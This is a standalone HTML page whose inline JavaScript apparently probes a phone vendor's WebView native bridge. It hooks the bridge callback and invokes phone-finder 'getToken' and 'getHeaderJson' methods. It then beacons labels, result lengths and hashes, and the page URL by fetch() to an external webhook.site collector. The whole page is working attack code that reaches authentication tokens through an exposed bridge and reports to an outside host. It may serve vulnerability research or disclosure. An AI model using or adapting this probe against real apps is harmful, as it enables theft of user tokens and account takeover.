<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>FMP_WEBHOOK_INIT</title>
</head>
<body>
<h1>FMP_WEBHOOK_BRIDGE_PROBE</h1>
<script>
(function () {
  const COLLECTOR = "https://webhook.site/59dbb195-25a2-4ae1-a6b3-52f1a40cd320";
  const marker = "FMP_WEBHOOK_" + Date.now();

  function hash32(s) {
    s = String(s || "");
    let h = 2166136261;
    for (let i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function safeString(x) {
    try {
      if (typeof x === "string") return x;
      return JSON.stringify(x);
    } catch (e) {
      return String(x);
    }
  }

  function beacon(label, data) {
    const s = safeString(data);
    const bridgeType = typeof window.HeytapNativeApi;
    const jsapiType = typeof window.HeytapJsApi;
    const len = s.length;
    const hash = hash32(s);

    document.title = label + "|bridge=" + bridgeType + "|len=" + len + "|hash=" + hash;

    try {
      fetch(
        COLLECTOR +
        "?m=" + encodeURIComponent(marker) +
        "&label=" + encodeURIComponent(label) +
        "&bridge=" + encodeURIComponent(bridgeType) +
        "&hasHeytapJsApi=" + encodeURIComponent(jsapiType) +
        "&len=" + encodeURIComponent(String(len)) +
        "&hash=" + encodeURIComponent(hash) +
        "&href=" + encodeURIComponent(location.href)
      ).catch(function(){});
    } catch (e) {}
  }

  beacon("PAGE_JS_STARTED", "init");

  window.HeytapJsApi = window.HeytapJsApi || {};
  const oldCallback = window.HeytapJsApi.callback;
  window.HeytapJsApi.callback = function (id, result) {
    beacon("CALLBACK_" + id, result);
    try {
      if (typeof oldCallback === "function") oldCallback.apply(this, arguments);
    } catch (e) {}
  };

  setTimeout(function () {
    beacon("BRIDGE_CHECK", typeof window.HeytapNativeApi);

    if (typeof window.HeytapNativeApi !== "undefined") {
      try {
        const r1 = window.HeytapNativeApi.invoke("find_phone_client.getToken", "{}", "cb_token");
        beacon("INVOKE_getToken_RETURN", String(r1));
      } catch (e) {
        beacon("INVOKE_getToken_ERR", e && e.stack ? e.stack : e);
      }

      try {
        const r2 = window.HeytapNativeApi.invoke("find_phone_client.getHeaderJson", "{}", "cb_header");
        beacon("INVOKE_getHeaderJson_RETURN", String(r2));
      } catch (e) {
        beacon("INVOKE_getHeaderJson_ERR", e && e.stack ? e.stack : e);
      }
    }
  }, 1000);
})();
</script>
</body>
</html>
